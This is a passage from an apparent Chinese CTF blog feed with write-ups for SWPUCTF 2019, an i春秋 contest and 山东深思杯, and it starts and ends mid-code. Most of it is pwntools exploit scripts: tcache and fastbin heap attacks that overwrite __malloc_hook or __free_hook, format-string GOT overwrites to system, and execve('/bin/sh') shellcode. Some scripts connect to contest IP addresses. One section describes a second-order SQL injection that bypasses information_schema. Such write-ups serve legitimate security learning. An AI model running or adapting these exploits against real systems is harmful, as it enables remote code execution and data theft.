class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">4</span>)show(<span class="hljs-number">6</span>)heap_addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-928</span>+<span class="hljs-number">0x18</span>ls(<span class="hljs-string">"heap addr"</span>,heap_addr)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">9</span>)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">0x20</span>, p64(heap_addr)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"remarks&gt;"</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))gdb.attach(p)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2019 write up</title>
      <link href="/2019/12/09/SWPUCTF-2019-write-up-md/"/>
      <url>/2019/12/09/SWPUCTF-2019-write-up-md/</url>
      
        <content type="html"><![CDATA[<h1 id="Web">Web<a class="post-anchor" href="#Web"></a></h1><h2 id="easy-web">easy_web<a class="post-anchor" href="#easy-web"></a></h2><p>Description<br>hint1：管理后台未完善 || hint2：无需扫描器 || hint3：不是xss<br>后来的hint：hint1：不是xss || hint2：使用somd5解flag<br>URL <a href="http://211.159.177.185:23456" target="_blank" rel="noopener">http://211.159.177.185:23456</a></p><p>考察的知识点为二次注入，bypass information_schema，通过子查询在没有列名的情况下查询数据</p><p>首先可以看到，有一个申请广告的地方，既然提示了不是xss，那么就自然考虑下sql注入<br>简单测试发现有报错和回显<br><a href="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" alt></a><br>经过测试发现，空格会被替换为空，过滤了or，and以及其他几乎全部报错函数，被一共有22列数据被查询出<br>那么我们可以利用这么一个性质来获取数据库名：在使用一个不存在的函数时，会报错显示当前的数据库名</p><p><a href="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" alt></a></p><p><a href="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" alt></a><br>这样就获取了数据库名<br>因为过滤了or，所以我们就无法使用information来获取表名，本来想用innodb_table_stats来获取表名来着，然鹅mysql这个关键词也被过滤了<br>还有一个叫做sys.schema_auto_increment_columns的表专门记录自增ID，从这里我们也可以获取表名<br><a href="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" alt></a><br>然后还是因为过滤了or和join，我们无法获得列名，只能通过子查询去更改列名<br>因为提示中给的是用somd5解出flag，所以我猜测flag为admin的密码<br><a href="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" alt></a><br><a href="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" alt></a><br>第二个就是admin的密码，用somd5解密即可获得flag</p><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="MISC">| MISC<a class="post-anchor" href="#MISC"></a></h2><p>内容是ntfs      flag.txt<br>使用ntfsstreamseditor工具，对着桌面扫ntfs流<br>扫出flag</p><h2 id="MISC-1">| MISC<a class="post-anchor" href="#MISC-1"></a></h2><p>binwalk分析一下，很多压缩包<br>binwalk -e分离出来<br>flag.doc里面的密文经过数次bs64解码得到一个密码<br>encode.txt bs64解码之后得到一个密码<br>分别把flag.jpg和good.mp3用密码解压出来<br>mp3文件放到Audacity分析，长音代表- 短音代表·<br>莫斯解密得到MORSEISVERYVERYEASY，<br>小写 swpuctf{morseisveryveryeasy}</p><h2 id="MISC-2">| MISC<a class="post-anchor" href="#MISC-2"></a></h2><p>根据提示ttl，2019西湖论剑misc原题，根据脚本恢复出一个txt文件。文件开头为50 4B，用winhex转为zip文件，需要密码打开压缩包。猜测是zip伪加密，放进ziperello中发现没有加密文件，果然是zip伪加密。010修改压缩包得到里面的flag.txt，是一串加密了n次的base64，脚本解到30次最终解完，但是是乱码。类似HECTF2019misc中flag仍可以被base6<br>4解密一次，所以打印出所有的解密结果，得到flag。</p><h1 id="PWN">PWN<a class="post-anchor" href="#PWN"></a></h1><h2 id="p1Kkheap">p1Kkheap<a class="post-anchor" href="#p1Kkheap"></a></h2><p>保护全开，并且程序自己写了几个限制条件<br>不能申请超过 0x100 大小的 chunk<br>不能 free 超过 3 次，add &lt;= 7<br>虽然有指针悬挂，free 之后 edit 因为 size 清零 不能正常的写值<br>tcache struct attack，爆破低2字节（直接 leak heap addr 也可以），使 fd 指向 heap 开头，控制 tcache_perthread_struct，修改 tcache-&gt;counts 和 tcache_entry</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span><span class="hljs-comment"># p = process('./p1Kkheap')</span>file_name = <span class="hljs-string">'./p1KkHeap'</span>libc_name = <span class="hljs-string">'./libc.so.6'</span>ip = <span class="hljs-string">''</span>prot = <span class="hljs-string">''</span>context.arch = <span class="hljs-string">'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"size: "</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))p.sendafter(<span class="hljs-string">"content: "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"4"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))shellcode = asm(<span class="hljs-string">'''nopnopmov rax,0x0000push raxmov rax,0x67616c662f2epush raxmov rdi, rspxor esi, esimov eax, 2syscallmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscall'''</span>)<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<span class="hljs-keyword">try</span>:p = process(file_name)<span class="hljs-comment"># raw_input('#')</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x10\x00'</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701000000000000</span>))free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)p.recvuntil(<span class="hljs-string">"content: "</span>)libc = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)+<span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">4111520</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc)malloc_hook = libc+lib.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc addr : 0x%x"</span>%malloc_hook)  edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701010000000000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(malloc_hook)+p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,shellcode)edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x66660002</span>))add(<span class="hljs-number">0x10</span>)<span class="hljs-keyword">except</span> EOFError:p.close()<span class="hljs-keyword">else</span>:p.interactive()<span class="hljs-keyword">break</span></code></pre><h2 id="login">login<a class="post-anchor" href="#login"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./login'</span>libc_name = <span class="hljs-string">'/lib/i386-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'108.160.139.79'</span>port = <span class="hljs-string">'9090'</span><span class="hljs-comment"># context.arch = 'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment"># p = remote(ip,int(port))</span>li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)key = <span class="hljs-string">"wllmmllw"</span>p.sendlineafter(<span class="hljs-string">"Please input your name: \n"</span>,<span class="hljs-string">"pumpkin9"</span>)payload = <span class="hljs-string">"%15$p"</span>p.sendlineafter(<span class="hljs-string">"password: \n"</span>,payload)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)libc = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-241</span>-lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc)onegg = libc + lib.symbols[<span class="hljs-string">'system'</span>]ls(<span class="hljs-string">"one_gadget"</span>,onegg)binsh = libc + lib.search(<span class="hljs-string">'/bin/sh'</span>).next()ls(<span class="hljs-string">"sh addr"</span>,binsh)p.recvuntil(<span class="hljs-string">"Try again!\n"</span>)p.sendline(<span class="hljs-string">"%6$p"</span>)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)stack = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)target = stack <span class="hljs-number">-12</span>ls(<span class="hljs-string">"stack addr"</span>,stack)ls(<span class="hljs-string">"target addr"</span>,target)<span class="hljs-comment"># gdb.attach(p)</span>num = target&amp;<span class="hljs-number">0xff</span>data1 = <span class="hljs-number">0x100</span><span class="hljs-comment">#onegg&amp;0xff</span>data2 = (onegg&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>data3 = (onegg&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>data4 = onegg&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sys1"</span>,data1)li(<span class="hljs-string">"sys2"</span>,data2)li(<span class="hljs-string">"sys3"</span>,data3)li(<span class="hljs-string">"sys3"</span>,data4)data5 = binsh&amp;<span class="hljs-number">0xff</span>data6 = ((binsh&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>)data7 = ((binsh&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>)data8 = binsh&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sh1"</span>,data5)li(<span class="hljs-string">"sh2"</span>,data6)li(<span class="hljs-string">"sh3"</span>,data7)li(<span class="hljs-string">"sh4"</span>,data8)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data1)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">1</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data2)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">2</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data3)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">3</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data4)+<span class="hljs-string">"c%10$hhn"</span>)gdb.attach(p)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">8</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data5)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">9</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data6)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">10</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data7)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">11</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data8)+<span class="hljs-string">"c%10$hhn"</span>)raw_input(<span class="hljs-string">'#'</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,key)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋-第三季CTF答题赛write up</title>
      <link href="/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/"/>
      <url>/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/</url>
      
        <content type="html"><![CDATA[<p>福利赛 题目还是比较友好的</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="Electrical-System">Electrical System<a class="post-anchor" href="#Electrical-System"></a></h2><p>bss 段有可执行权限，写一段shellcode，控制程序跳转即可</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-comment">#p = process("./Electrical System")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11002</span>)elf=ELF(<span class="hljs-string">"./Electrical System"</span>)shellcode =<span class="hljs-string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span>p.sendlineafter(<span class="hljs-string">"enter your electric card 's ID:\n"</span>,shellcode)payload = <span class="hljs-string">"Recharge"</span>+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">7</span><span class="hljs-comment"># payload = "Check"+p8(0)+"a"*10</span>payload += p64(<span class="hljs-number">0x00000000006020E0</span>)p.sendlineafter(<span class="hljs-string">"Please enter your choice:\n"</span>,payload)p.interactive()</code></pre><h2 id="Car-Search-System">Car Search System<a class="post-anchor" href="#Car-Search-System"></a></h2><p>格式化字符串，首先leak libc，然后修改0xff为0x66，直接修改栈上的值，程序会down掉，所以可以通过指针v8来修改<br>最后修改puts@got为system。</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment"># context.log_level = 'debug'</span><span class="hljs-comment"># p = process("./pwn")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11001</span>)elf=ELF(<span class="hljs-string">"./pwn"</span>)lib = ELF(<span class="hljs-string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)offset = <span class="hljs-number">30</span>p.recvuntil(<span class="hljs-string">"leave\n"</span>)p.sendline(<span class="hljs-string">"%59$p"</span>)__libc_start_main = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-247</span><span class="hljs-keyword">print</span> hex(__libc_start_main)libc = __libc_start_main - lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]log.success(<span class="hljs-string">"libc base addr : 0x%x"</span>%libc)system = libc+lib.symbols[<span class="hljs-string">'system'</span>]log.success(<span class="hljs-string">"onegadget addr : 0x%x"</span>%system)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = fmtstr_payload(<span class="hljs-number">30</span>,&#123;elf.got[<span class="hljs-string">"puts"</span>]:system&#125;)p.sendline(payload)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = <span class="hljs-string">"%51$p"</span>p.sendline(payload)point = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)log.success(<span class="hljs-string">"pointer addr : 0x%x"</span>%point)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = p32(point)+<span class="hljs-string">"%98c%30$hhn"</span>p.sendline(payload)p.sendlineafter(<span class="hljs-string">"ar in 7 day"</span>,<span class="hljs-string">"/bin/sh\x00"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h2 id="geek-notes">geek notes<a class="post-anchor" href="#geek-notes"></a></h2><p>UAF</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><span class="hljs-comment"># encoding:utf-8</span><span class="hljs-comment"># ___Author___ : "pumpkin9"</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context(terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>])p =process(<span class="hljs-string">"./geek notes"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span><span class="hljs-params">(length,content)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"1"</span>)p.recvuntil(<span class="hljs-string">"Note size :"</span>)p.sendline(str(length))p.recvuntil(<span class="hljs-string">"Content :"</span>)p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"2"</span>)p.recvuntil(<span class="hljs-string">"Index :"</span>)p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span><span class="hljs-params">(idx)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"3"</span>)p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(idx))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 0</span>addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 1</span>delnote(<span class="hljs-number">0</span>)printnote(<span class="hljs-number">0</span>)libc_base = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00\x00'</span>)<span class="hljs-number">-3951480</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 2</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 3</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"bbbbbbbb"</span>) <span class="hljs-comment"># 4</span>delnote(<span class="hljs-number">3</span>)delnote(<span class="hljs-number">4</span>)delnote(<span class="hljs-number">3</span>)addnote(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice :"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"Note size :"</span>,str(<span class="hljs-number">10</span>))<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h1 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h1><h2 id="integer-seq">integer_seq<a class="post-anchor" href="#integer-seq"></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>山东深思杯write up</title>
      <link href="/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/"/>
      <url>/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="FuQiang">FuQiang<a class="post-anchor" href="#FuQiang"></a></h2><p>程序</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="pwn1">pwn1<a class="post-anchor" href="#pwn1"></a></h2><p>题目给了一个backdoor ，满足约束条件即可</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level=<span class="hljs-string">'debug'</span>p = process(<span class="hljs-string">"./pwn_MinZhu"</span>)<span class="hljs-comment">#p =remote("172.29.1.38", 9999)</span>elf = ELF(<span class="hljs-string">"./pwn_MinZhu"</span>)system = <span class="hljs-number">0x08048696</span>plt = elf.got[<span class="hljs-string">'puts'</span>]p.sendlineafter(<span class="hljs-string">"Key:"</span>,<span class="hljs-string">"xNd9y6"</span>)offset = <span class="hljs-number">4</span>p.recvuntil(<span class="hljs-string">"your msg:"</span>)payload=fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A064</span>:<span class="hljs-number">0x3</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A060</span>:<span class="hljs-number">8217</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;plt:<span class="hljs-number">0x8048696</span>&#125;)p.sendline(payload)<span class="hljs-string">'''SHBYTE = 57 9SHBYTE1 = 78 NSHBYTE2 = 100 dCHAR S = 120 xv4 =6v3 = yxNd9y6'''</span>p.interactive()</code></pre><h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level='debug'</span>context.terminal=[<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"split"</span>,<span class="hljs-string">"-h"</span>]p = process(<span class="hljs-string">"./pwn"</span>)libc = ELF(<span class="hljs-string">"./libc.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(size))p.sendlineafter(<span class="hljs-string">"Leave your message:\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">3</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))p.sendlineafter(<span class="hljs-string">"Enter what you want to modify:\n"</span>,content)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>delete(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">"aaaaaaa"</span>) <span class="hljs-comment">#3</span>show()p.recvuntil(<span class="hljs-string">"Sticky note:aaaaaaa\n"</span>)libc_base = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-0x3c4b78</span>log.success(<span class="hljs-string">"libc_base : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)delete(<span class="hljs-number">4</span>)delete(<span class="hljs-number">5</span>)delete(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span 